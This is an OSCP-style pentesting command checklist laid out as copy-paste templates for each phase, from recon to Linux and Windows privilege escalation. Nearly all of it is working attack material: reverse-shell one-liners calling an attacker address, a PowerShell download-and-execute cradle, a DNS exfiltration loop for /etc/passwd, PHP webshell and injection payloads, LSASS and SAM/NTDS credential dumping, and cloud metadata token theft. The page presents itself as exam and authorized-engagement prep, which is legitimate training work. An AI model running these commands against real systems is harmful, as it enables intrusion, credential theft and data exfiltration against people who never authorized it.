+++
title = 'Pentesting Command Checklist'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['oscp', 'methodology', 'commands']
+++

> Copy-paste command sheet for a general pentest or an OSCP-style exam: one block per phase, checkboxes for the steps, exact commands for the tool versions shipped on current distributions. It is the companion to the [methodology](/notes/oscp-labs/methodology/) — the methodology explains *why* and *when*, this page is what you actually type. Every command is a **template**: read it, substitute the variables, and check the precondition before running it.

> **Version drift is the #1 cause of a "broken" cheat sheet.** Recent tool releases changed flags in `nxc`, `certipy`, `impacket`, `ligolo-ng`, and `hashcat`. Before trusting a command: `nxc --help`, `certipy <subcommand> -h`, `impacket-<tool> -h`, `hashcat --example-hashes`. If your install predates mid-2026, several of the modules below (ADCS ESC17, `nxc --ntds --use-vss`, `--remove-mic`) will not exist.

## How to use this page

1. **Copy the [Variables](#variables) block** into the shell you will use for the engagement. Every command below assumes those names are exported.
2. **Replace every `<placeholder>`** in angle brackets (`<share>`, `<svc>`, `<template>`, `<CA-NAME>`) and any quoted value that is obviously not yours.
3. **Check the precondition** in front of the command — credentials, an open port, a session, a synced clock. Most "broken" commands on this page are a missing precondition, not a wrong flag.
4. **Run one step at a time and read the output.** The checkboxes are ordered by cost, not importance; skip the ones whose precondition is absent and record why.
5. **Confirm the flag on your install** when a tool changes often: `nxc --help`, `certipy req -h`, `impacket-GetUserSPNs -h`, `hashcat --example-hashes`.

The same command appears in more than one phase, and again in the one-page
pre-flight blocks — deliberately, so you never have to jump sections mid-box.
When a tool changes a flag, update every copy of the line.

{{< hint warning >}}
These are **templates, not fire-and-forget**. Anything that writes, resets, configures or coerces can break the target: `sc config`, `certipy template`, `setuserinfo2`, `ntlmrelayx`, `xp_cmdshell`, `diskshadow`, `reg save`, and every password reset need the authorization and rollback plan from [Phase 0](/notes/oscp-labs/methodology/). On shared lab infrastructure, prefer read-only proof and revert what you change.
{{< /hint >}}

## Variables

```bash
# --- engagement context: export once per shell, re-export after a VPN reconnect
export IP="<target-ip>"                 # single host under test
export DOMAIN="<domain>"                # AD DNS name, e.g. sequel.htb
export DC="<dc-ip-or-fqdn>"             # domain controller
export USER="<username>"                # current / assumed-breach account
export PASS='<password>'                # single quotes keep $ ! and backticks literal
export HASH="<ntlm-hash>"               # NT half only, no LM half, no colons
export ATTACKER="<tun0-ip>"             # your reachable address: ip -4 addr show tun0
export LPORT="443"                      # 443/80/53 survive most egress filters
export WORDLIST="/usr/share/wordlists/rockyou.txt"
```

```bash
# --- wordlists used below (optional, saves typing)
export DIRLIST="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
export VHOSTLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
export USERS="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
# some builds ship the dir list as DirBuster-2007_directory-list-2.3-medium.txt:
ls /usr/share/seclists/Discovery/Web-Content/ | grep -i directory-list
```

```bash
# --- name resolution: one line per host/vhost, never rewrite existing lines
echo "$IP $DOMAIN dc01.$DOMAIN" | sudo tee -a /etc/hosts
# a discovered vhost points at the same IP:
echo "$IP wiki.$DOMAIN" | sudo tee -a /etc/hosts
```

> `USER` shadows your login name inside this shell only. If a tool misbehaves after exporting it, run that tool in a fresh shell. Keep `"$USER"` in double quotes so names with spaces survive.

## 0. Engagement / exam workflow

Timebox a 24-hour exam as four blocks. The split is the default; move time, never the order.

| Block | Share | 24 h | Ends when |
| ----- | ----- | ---- | --------- |
| Recon | 20% | ~4.5 h | every port on every target is enumerated or explicitly deferred |
| Foothold | 30% | ~7 h | a shell/credential on each standalone box, any domain account on the AD set |
| Privilege escalation | 30% | ~7 h | root/SYSTEM/DA proof captured, or the path is documented as failed |
| Documentation | 20% | ~4.5 h | screenshots, command log and report skeleton are complete |

- [ ] **T+0** — start full TCP scans on *every* target in parallel, then write the host skeleton while they run.
- [ ] **T+0** — open a transcript per host and note the source interface; you will not remember which VPN address you used.
- [ ] **Every 30 min** — update the host page: facts, credentials, services, attempted, next. Documentation is a running task, not the last block.
- [ ] **At each block boundary** — check the clock, not your curiosity: if a box consumed its share, leave a note and rotate.
- [ ] **T-90 min** — stop attacking, capture proof, clean up, write.

```bash
mkdir -p engagement/{hosts,evidence,loot}
script -q -f "engagement/hosts/$IP.log"
date -u +"%Y-%m-%dT%H:%M:%SZ" | tee -a "engagement/hosts/$IP.md"
```

```bash
# keep output: tee everything that produces a finding (after the port list exists, section 1)
nmap -sCV -Pn -n -p"$PORTS" "$IP" -oA "engagement/hosts/$IP/nmap" | tee -a "engagement/hosts/$IP.md"
ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -ac -o "engagement/hosts/$IP/ffuf.json" -of json
# screenshot with a timestamp in the name (import = ImageMagick, needs X)
import -window root "engagement/evidence/$(date +%Y-%m-%d_%H%M)_$IP.png"
sha256sum engagement/evidence/*.png >> engagement/evidence/hashes.txt
```

**When to move on** — park a path, don't abandon it silently:

- 20–30 min on one hypothesis with no new fact → write the failed path down and switch.
- The precondition is absent (wrong version, feature disabled, no route, no creds) → more tries will not help.
- Three *different* adaptations of one exploit failed → change attack class or port, not payload.
- You already recorded this exact step as failed → you are looping; re-read the notes page.
- The path risks the host (kernel panic, service crash, lockout) more than it promises.

**The 60-second orientation block** — run these before anything else; they change what you do next:

```bash
id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null
ip -4 addr show tun0 | grep inet; ip route
sudo -V 2>/dev/null | head -1
date -u; ntpdate -q "$DC" 2>/dev/null | head -1     # for AD targets only
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -3
realm list 2>/dev/null; ps aux | grep -E 'sssd|winbind' | grep -v grep
```

## 1. Recon & enumeration

- [ ] **TCP passes** — top-1000 now, full sweep in parallel; derive `PORTS` from the full scan.
```bash
sudo nmap -sCV -Pn -n --top-ports 1000 -T4 -oA nmap-top "$IP" &
sudo nmap -sS -Pn -n -p- --min-rate 5000 --max-retries 1 -oA nmap-all "$IP"
export PORTS="$(grep -oE '^[0-9]+/tcp +open' nmap-all.nmap | cut -d/ -f1 | paste -sd,)"
echo "$PORTS"
```

- [ ] **Versions + targeted NSE** — only against the ports that are actually open.
```bash
sudo nmap -sCV -Pn -n -p"$PORTS" --version-all -oA nmap-svc "$IP"
nmap -Pn -n -p"$PORTS" --script "http-title,http-headers,http-git,ssl-cert,smb-os-discovery,smb2-security-mode,ftp-anon,nfs-showmount" "$IP"
```

- [ ] **UDP** — 161, 69, 123, 53, 623 are missed by TCP-only scans.
```bash
sudo nmap -sU -Pn -n --top-ports 50 --open --min-rate 1000 -oA nmap-udp "$IP"
sudo nmap -sU -Pn -n -p161 --script snmp-info,snmp-brute "$IP"
```

- [ ] **Hosts file** — before any vhost work; verify with a name-based request.
```bash
printf '%s %s %s\n' "$IP" "$DOMAIN" "dc01.$DOMAIN" | sudo tee -a /etc/hosts
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://$DOMAIN/"
```

- [ ] **Vhost discovery** — the IP root is frequently a decoy; calibrate against a random Host header.
```bash
curl -s -o /dev/null -w '%{size_download}\n' -H "Host: $(head -c6 /dev/urandom | base64 | tr -d '/+=').$DOMAIN" "http://$IP/"
ffuf -u "http://$IP" -H "Host: FUZZ.$DOMAIN" -w "$VHOSTLIST" -ac
gobuster vhost -u "http://$IP" -w "$VHOSTLIST" --append-domain --domain "$DOMAIN" --exclude-length <baseline-length>
```

- [ ] **Web fingerprint** — headers, title, generator, TLS SANs, WAF.
```bash
curl -sI "http://$IP/"; whatweb -a 3 "http://$IP" -v
nmap -Pn -n -p443 --script ssl-cert "$IP"
openssl s_client -connect "$IP:443" -servername "$DOMAIN" </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'
wafw00f "http://$IP"
```

- [ ] **Content discovery** — extensions from what you observed, not a generic list.
```bash
ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -e .php,.txt,.html,.bak,.old,.zip -ac -t 60
feroxbuster -u "http://$IP" -w "$DIRLIST" -x php,txt,html -d 2 -C 404
```

- [ ] **`.git`, backups, and exposed secrets** — the fastest win on a web host and the most-missed by automated scanners.
```bash
git-dumper "http://$IP/.git" ./dumped-repo 2>/dev/null
cd dumped-repo && git log -p --all | head -200; git diff --cached
gitleaks detect --source . --verbose 2>/dev/null
trufflehog filesystem . --only-verified --no-update 2>/dev/null
curl -s "http://$IP/.env"; curl -s "http://$IP/backup.zip" -o backup.zip && unzip -l backup.zip
```

- [ ] **SMB** — null, guest, shares, signing; try a second tool before declaring SMB closed.
```bash
smbclient -N -L "//$IP"
nxc smb "$IP" -u '' -p '' --shares
smbmap -H "$IP" -u "$USER" -p "$PASS" -r <share>
smbclient "//$IP/<share>" -U "$USER%$PASS" -c 'recurse ON; prompt OFF; mget *'
smbclient -N "//$IP/IPC\$" -c 'ls'                 # Named-pipe probe
```

- [ ] **RPC / user enumeration** — valid users before any spraying.
```bash
rpcclient -U "" -N "$IP" -c "enumdomusers;enumdomgroups;querydominfo"
rpcclient -U "" -N "$IP" -c "netshareenumall"
nxc smb "$IP" -u '' -p '' --rid-brute
enum4linux-ng -A "$IP" -oA "engagement/hosts/$IP/enum4linux"
```

- [ ] **LDAP** — only if 389/636/3268 is open; anonymous bind first, then credentials.
```bash
ldapsearch -x -H "ldap://$DC" -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
nxc ldap "$DC" -u "$USER" -p "$PASS" --users --groups
ldapsearch -x -H "ldap://$DC" -b "DC=<domain>,DC=<tld>" "(objectClass=*)"
```

- [ ] **SNMP** — walk to a file, then read process command lines; that is where passwords are.
```bash
snmpbulkwalk -v2c -c public -Cr1000 "$IP" .1 | tee "engagement/hosts/$IP/snmp.txt"
snmpwalk -v2c -c public "$IP" 1.3.6.1.2.1.25.4.2.1.5 | grep -iE 'pass|pwd|login|token|user'
snmp-check "$IP" -c public -v 2c
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$IP"
```

- [ ] **NFS** — `showmount` output is a credential source, not just a file share.
```bash
showmount -e "$IP"
sudo mkdir -p /mnt/nfs && sudo mount -t nfs "$IP":/srv/nfs /mnt/nfs -o nolock
find /mnt/nfs -name '*.sql' -o -name '*.env' -o -name 'id_rsa' 2>/dev/null
```

- [ ] **FTP** — anonymous first, then banner/version.
```bash
nmap -Pn -n -p21 --script ftp-anon,ftp-syst "$IP"
wget -m --no-passive "ftp://anonymous:anonymous@$IP/"
```

- [ ] **DNS** — zone transfer, subdomains, PTR; a DC almost always has 53 open.
```bash
dig axfr "$DOMAIN" @"$DC"; dig +short -x "$IP"
gobuster dns -d "$DOMAIN" -w "$VHOSTLIST" --resolver "$DC" -q
```

- [ ] **MSSQL / MySQL** — instance info, weak auth, then queries.
```bash
nxc mssql "$IP" -u "$USER" -p "$PASS" --local-auth
impacket-mssqlclient "$DOMAIN/$USER:$PASS@$IP" -windows-auth
mysql -h "$IP" -u "$USER" -p"$PASS" -e 'SELECT @@version, @@secure_file_priv, user();'
```

- [ ] **RDP / WinRM** — 3389/5985/5986 are shells when the account is allowed.
```bash
nmap -Pn -n -p3389 --script rdp-enum-encryption,rdp-ntlm-info "$IP"
nxc winrm "$IP" -u "$USER" -p "$PASS"
evil-winrm -i "$IP" -u "$USER" -p "$PASS"
xfreerdp /v:"$IP" /u:"$USER" /p:"$PASS" /cert:ignore /dynamic-resolution +clipboard
```

- [ ] **Cloud metadata** — try every provider on any host that might be a cloud VM.
```bash
curl -s http://169.254.169.254/latest/meta-data/                          # AWS IMDSv1
curl -s -H "X-aws-ec2-metadata-token: $(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')" http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"   # Azure
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

- [ ] **Container escape reconnaissance** — if `/.dockerenv` or `kubepods` in `cgroup` matched.
```bash
capsh --print | grep -E 'cap_sys_admin|cap_dac_read_search|cap_sys_ptrace|cap_sys_module'
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
mount | grep -E ' / | /host |overlay'
cat /proc/sys/kernel/core_pattern 2>/dev/null      # writable = host exec
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /proc/self/status | grep -i cap
```

- [ ] **Web ports beyond 80/443** — every open HTTP port gets the full web workflow, not a single `curl -I`.
```bash
for p in $(echo "$PORTS" | tr ',' '\n'); do
  curl -s -o /dev/null -w "port $p: %{http_code} %{content_type}\n" "http://$IP:$p/" 2>/dev/null
done
```

## 2. Web foothold

- [ ] **Directories first** — one calibrated run, then recurse only where the app is interesting.
```bash
ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -e .php,.txt,.html,.js -ac -t 60
ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -recursion -recursion-depth 2 -e .php -ac
gobuster dir -u "http://$IP" -w "$DIRLIST" -x php,txt,html -t 40
```

- [ ] **Vhosts and subdomains** — repeat against every name you find.
```bash
ffuf -u "http://$IP" -H "Host: FUZZ.$DOMAIN" -w "$VHOSTLIST" -mc all -ac
gobuster vhost -u "http://$DOMAIN" -w "$VHOSTLIST" --append-domain
```

- [ ] **Parameter discovery** — GET names, then POST bodies.
```bash
ffuf -u "http://$IP/index.php?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw <baseline>
ffuf -u "http://$IP/login" -X POST -d 'FUZZ=value' -H 'Content-Type: application/x-www-form-urlencoded' -fw <baseline>
arjun -u "http://$IP/api/users" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

- [ ] **Upload tests** — change one control at a time: name, extension, Content-Type, magic bytes.
```bash
curl -s -F 'file=@shell.php;type=image/png;filename=shell.php.png' "http://$IP/upload.php"
curl -s -F 'file=@shell.php;type=image/png;filename=shell.php%00.png' "http://$IP/upload.php"
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg -o polyglot.php
```

- [ ] **LFI checks** — traversal, filters, wrappers, then code execution.
```bash
curl -s "http://$IP/index.php?page=../../../../etc/passwd"
curl -s "http://$IP/index.php?page=....//....//....//etc/passwd"
curl -s "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
curl -s "http://$IP/index.php?page=/var/log/apache2/access.log&cmd=id" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
```

- [ ] **SQLi quick tests** — quote, comment, arithmetic, time; hand it to sqlmap only when manual works.
```bash
curl -s "http://$IP/item.php?id=1'"; curl -s "http://$IP/item.php?id=1%27%20--%20-"
curl -s "http://$IP/item.php?id=1%20AND%201=2"
curl -s -w '\n%{time_total}\n' "http://$IP/item.php?id=1'%20OR%20SLEEP(5)--%20-"
sqlmap -r request.txt --batch --level 3 --risk 2 --technique=BEU --dbms=<db>
```

- [ ] **Command injection** — separators, then space/character bypasses, then out-of-band.
```bash
curl -s "http://$IP/ping.php?ip=127.0.0.1;id"
curl -s "http://$IP/ping.php?ip=127.0.0.1%0aid"; curl -s "http://$IP/ping.php?ip=127.0.0.1|id"
curl -s "http://$IP/ping.php?ip=127.0.0.1\$(id)"; curl -s "http://$IP/ping.php?ip=127.0.0.1%3Bcat\${IFS}/etc/passwd"
```

- [ ] **SSRF** — loopback, metadata, alternate schemes, then internal services.
```bash
curl -s -X POST "http://$IP/fetch" -d 'url=http://127.0.0.1:80/'
curl -s -X POST "http://$IP/fetch" -d 'url=http://169.254.169.254/latest/meta-data/'
curl -s -X POST "http://$IP/fetch" -d 'url=file:///etc/passwd'
```

- [ ] **SSTI** — confirm with arithmetic, identify the engine, then a documented gadget.
```bash
curl -s "http://$IP/?name=\${7*7}"; curl -s "http://$IP/?name={{7*7}}"; curl -s "http://$IP/?name=<%=7*7%>"
curl -s "http://$IP/?name={{config}}"
curl -s "http://$IP/?name={{cycler.__init__.__globals__.os.popen('id').read()}}"                    # Jinja2
curl -s "http://$IP/?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"  # FreeMarker
```

- [ ] **JWT** — decode, tamper, then crack; check `alg`, `kid`, `jku`.
```bash
cut -d. -f2 <<< "<jwt>" | tr '_-' '/+' | base64 -d 2>/dev/null
jwt_tool.py "<jwt>" -M at
jwt_tool.py "<jwt>" -C -d "$WORDLIST"
hashcat -m 16500 jwt.txt "$WORDLIST"
```

- [ ] **Deserialization** — only when the app carries a serialized blob (cookie, view state, parameter).
```bash
java -jar ysoserial.jar CommonsCollections1 "curl http://$ATTACKER/x" | base64 -w0
phpggc -l; phpggc Monolog/RCE1 system id -b
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
```

- [ ] **XSS chain to admin interaction** — DOM XSS, CSP bypass, and (2026) AI-agent prompt injection. A reflected payload that does not execute in a real browser is not a finding.
```bash
# Verify execution with a headless browser, not reflection
cat > /tmp/xss.js <<'EOF'
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch(); const p = await b.newPage();
  p.on('dialog', async d => { console.log('XSS:', d.message()); await d.dismiss(); });
  await p.goto(process.argv[2]); await b.close();
})();
EOF
node /tmp/xss.js "http://$IP/vuln?q=<img src=x onerror=alert(document.domain)>"
```

**If X, try Y** — 403 means the path exists (try `.bak`, `/.git/`, `OPTIONS`, trailing slash). No vhost hits → read the TLS SAN and page source. Upload rejected → extension, then Content-Type, then magic bytes, then `.htaccess`/`web.config`. `..` filtered → `....//` or an absolute path; Windows needs `\windows\win.ini`. SQLi quotes blocked → numeric context or JSON body. `{{7*7}}` renders → engine fingerprint, then gadget. JWT `none` rejected → weak HS256 secret, `kid` injection, `jku`. No deserialization gadget → base64 cookie is the usual carrier.

## 3. Shells & file transfer

- [ ] **Listener** — `rlwrap` first; a raw `nc` shell hides tab completion and Ctrl-C.
```bash
rlwrap -cAr nc -lvnp "$LPORT"
socat -d -d TCP-LISTEN:4444 STDOUT
```

- [ ] **Metasploit handler** — when a staged payload or module needs one.
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $ATTACKER; set LPORT $LPORT; run"
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $ATTACKER; set LPORT $LPORT; run"
```

- [ ] **One-liners** — pick the interpreter the target actually has.
```bash
bash -i >& /dev/tcp/"$ATTACKER"/"$LPORT" 0>&1
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$ATTACKER',$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-i'])"
php -r "\$sock=fsockopen('$ATTACKER',$LPORT);exec('/bin/sh -i <&3 >&3 2>&3');"
rm -f /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc "$ATTACKER" "$LPORT" 1>/tmp/p
```

```powershell
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/rev.ps1')"
# nishang: Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER> -Port <LPORT>
```

- [ ] **TTY upgrade** — before `sudo`, `su`, or anything interactive.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 120
```

- [ ] **Download to the target** — stage a file, then execute it; `curl | bash` dies in Java/PHP contexts.
```bash
wget "http://$ATTACKER/linpeas.sh" -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
curl -s "http://$ATTACKER/rev.sh" -o /tmp/rev.sh && bash /tmp/rev.sh
```

```powershell
certutil.exe -urlcache -split -f http://<ATTACKER>/nc.exe C:\Temp\nc.exe
bitsadmin /transfer job http://<ATTACKER>/nc.exe C:\Temp\nc.exe
powershell -nop -c "Invoke-WebRequest http://<ATTACKER>/nc.exe -OutFile C:\Temp\nc.exe"
```

- [ ] **SMB delivery** — the most reliable channel when HTTP is filtered.
```bash
impacket-smbserver share . -smb2support -username df -password df
```
```powershell
net use \\<ATTACKER>\share /user:df df
copy \\<ATTACKER>\share\nc.exe C:\Temp\nc.exe
```

- [ ] **Upload back to the attacker host** — `python3 -m http.server` cannot receive; use these.
```bash
python3 -m uploadserver 8000          # pip install uploadserver
nc -lvnp 8000 > loot.zip          # target: nc.exe <ATTACKER> 8000 < C:\Temp\loot.zip
socat -u TCP-LISTEN:8000,reuseaddr,fork OPEN:loot.zip,creat,append
```

```powershell
$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\loot.zip"))
Invoke-RestMethod -Uri http://<ATTACKER>:8000/upload -Method Post -Body $b64
```

- [ ] **Base64** — small files, and filters that mangle binary.
```bash
base64 -w0 file.bin > file.b64 && base64 -d file.b64 > file.bin
# target: certutil -decode file.b64 file.bin
```

- [ ] **File transfer via DNS** — when only DNS egress survives; slower than HTTP but survives most filters.
```bash
# On the attacker host: capture DNS
sudo tcpdump -ni tun0 -s0 port 53
# On target: encode chunked
base64 -w0 /etc/passwd | fold -w63 | while read c; do host "$c.exfil.$DOMAIN" >/dev/null; done
```

## 4. Linux privilege escalation

- [ ] **Identity and sudo** — the highest-value 10 seconds on the box.
```bash
id; whoami; hostname; sudo -V | head -1
sudo -l
sudo -l | grep -E 'NOPASSWD|SETENV|env_keep|!authenticate'
```

- [ ] **Read the sudo output** — runas user, wildcards, relative paths, CVE applicability.
```bash
sudo -u <user> /bin/bash                    # (scriptmanager : scriptmanager) NOPASSWD: ALL
sudo -u#-1 /bin/bash                        # CVE-2019-14287, sudo < 1.8.28 only
sudo --chroot=/tmp /bin/true                # CVE-2025-32463, sudo 1.9.14–1.9.17: nsswitch LPE
echo "$PASS" | sudo -S <cmd>                # rule is not NOPASSWD
```

- [ ] **GTFOBins** — substitute the binary `sudo -l` allows.
```bash
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo wget --input-file /root/root.txt
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
sudo nginx -c /dev/shm/nginx.conf
```

- [ ] **SUID / SGID and capabilities** — list, GTFOBins, then `strings`/`ltrace`.
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace'
/usr/bin/bash -p
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'   # cap_setuid+ep
ltrace ./suspect 2>&1 | grep -E 'system|popen|exec'
readelf -d /path/to/suid 2>/dev/null | grep -E 'RPATH|RUNPATH'         # writable dir → .so hijack
```

- [ ] **Cron, timers, watchers** — read the job, then the permissions of everything it touches.
```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.* 2>/dev/null
crontab -l; ls -la /var/spool/cron/crontabs 2>/dev/null
systemctl list-timers --all; systemctl list-units --type=service --state=running
./pspy64 -pf -i 1000
ls -la /path/to/script            # run twice: a ticking mtime is a job you cannot read
```

- [ ] **Cron wildcard injection** — only if the job expands `*` in a directory you can write.
```bash
cd /home/<user>/backup
printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' > shell.sh && chmod +x shell.sh
touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
/tmp/rootbash -p
```

- [ ] **Groups** — docker, lxd, disk, adm, shadow, staff are root-equivalent in practice.
```bash
docker images; docker run -v /:/mnt --rm -it <image> chroot /mnt sh
lxc image import <template.tar.xz> --alias temp; lxc init temp r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true; lxc exec r00t /bin/bash
debugfs -R 'cat /etc/shadow' /dev/sda1
```

- [ ] **Environment** — `env_keep`, `SETENV`, and root programs calling commands by relative path.
```bash
env; echo "$PATH"; sudo -l | grep -E 'env_keep|SETENV'
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so /usr/bin/<allowed-binary>
export PATH=/tmp:$PATH; <root-run-program>      # it calls ps/tar/cat without a path
```

- [ ] **Writable systemd units or `/etc/ld.so.preload`** — silent, immediate root on next execution.
```bash
find /etc/systemd/system -type f -writable 2>/dev/null
ls -la /etc/ld.so.preload 2>/dev/null && echo '/tmp/x.so' > /etc/ld.so.preload
```

- [ ] **NFS** — a writable `no_root_squash` export is an instant root.
```bash
showmount -e "$IP"
sudo mount -t nfs "$IP":/tmp /mnt/nfs -o nolock
cp /bin/bash /mnt/nfs/rootbash && sudo chown root:root /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash
/tmp/rootbash -p
```

- [ ] **Local credentials before exploits** — configs, history, keys, DB files.
```bash
grep -riE 'pass|pwd|secret|token' ~/.bash_history /home/*/.bash_history /var/www /opt /srv 2>/dev/null | head -50
ls -la ~/.ssh /home/*/.ssh 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null
find / -name '*.sql' -o -name '*.bak' -o -name '*.old' -o -name '.env' 2>/dev/null | head
ss -tnl
```

- [ ] **Kernel last** — only after every configuration path is recorded as failed.
```bash
uname -a; cat /etc/os-release
searchsploit linux kernel "$(uname -r)"; ./linux-exploit-suggester.sh
# 2026 page-cache LPEs (do not touch disk — integrity tools do not see them)
cat /proc/crypto | grep -i aead; lsmod | grep -E 'xfrm|rxrpc'
```

## 5. Windows privilege escalation

- [ ] **Identity and privileges** — map each right to a technique before enumerating further.
```powershell
whoami /all
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
net localgroup administrators
Get-LocalUser | Format-Table Name,Enabled,LastLogon
```

| Privilege | Tool / path |
| --------- | ----------- |
| `SeImpersonatePrivilege` | GodPotato, PrintSpoofer, RoguePotato (build-dependent) |
| `SeAssignPrimaryTokenPrivilege` | same potato family |
| `SeBackupPrivilege` / `SeRestorePrivilege` | `reg save`, `robocopy /B`, `diskshadow`, `ntds.dit` |
| `SeTakeOwnershipPrivilege` | `takeown` + `icacls` + replace a SYSTEM binary |
| `SeDebugPrivilege` | `procdump` / `comsvcs.dll MiniDump` on LSASS |
| `SeLoadDriverPrivilege` | EopLoadDriver + a vulnerable driver (Capcom.sys) |
| `AlwaysInstallElevated` (both keys) | `msiexec /i rev.msi` as SYSTEM |

- [ ] **Token abuse (SeImpersonate)** — spooler running → PrintSpoofer; modern build → GodPotato.
```powershell
sc.exe query spooler
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\Temp\nc.exe <ATTACKER> <LPORT> -e cmd"
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\Temp\nc.exe <ATTACKER> <LPORT> -e cmd"
```

- [ ] **Services and binaries** — writable binary, writable service DACL, unquoted path.
```powershell
Get-CimInstance win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
sc.exe qc <svc>
icacls "C:\Program Files\<vendor>\<svc>.exe"
accesschk.exe /accepteula -uwcqv "Users" *
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

- [ ] **Service abuse** — mandatory space after `binpath=`; error 1053 is expected and harmless.
```powershell
sc.exe config <svc> binpath= "cmd /c net localgroup administrators <USER> /add"
sc.exe stop <svc>; sc.exe start <svc>
sc.exe config <svc> binpath= "<original-path>"     # restore afterwards
```

- [ ] **ACLs and stored credentials** — read the whole path, then the files that hold secrets.
```powershell
icacls "C:\ProgramData\<dir>"; icacls "C:\<path>\<file>"
cmdkey /list
runas /savecred /user:<DOMAIN>\<user> "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/rev.ps1')"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- [ ] **AlwaysInstallElevated** — both keys must be `0x1`; the MSI then runs as SYSTEM.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$ATTACKER" LPORT="$LPORT" -f msi -o rev.msi
```
```powershell
msiexec /quiet /qn /i C:\Temp\rev.msi
```

- [ ] **Credential hunting** — user files first, hives second.
```powershell
cmd /c dir /S /B *pass*.txt *pass*.xml *cred* *vnc* *.config* 2>nul
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1
gc (Get-PSReadLineOption).HistorySavePath
cmd /c dir /R C:\Users\<user>\Desktop
```

- [ ] **LSASS, SAM/SYSTEM, NTDS** — check RunAsPPL first; copy hives, parse on the attacker host.
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
reg save hklm\sam C:\Temp\sam; reg save hklm\system C:\Temp\system; reg save hklm\security C:\Temp\security
```
```bash
pypykatz lsa minidump lsass.dmp
impacket-secretsdump -sam sam -system system -security security LOCAL
nxc smb "$IP" -u "$USER" -p "$PASS" --sam --lsa
nxc smb "$DC" -u "$USER" -p "$PASS" --ntds
```

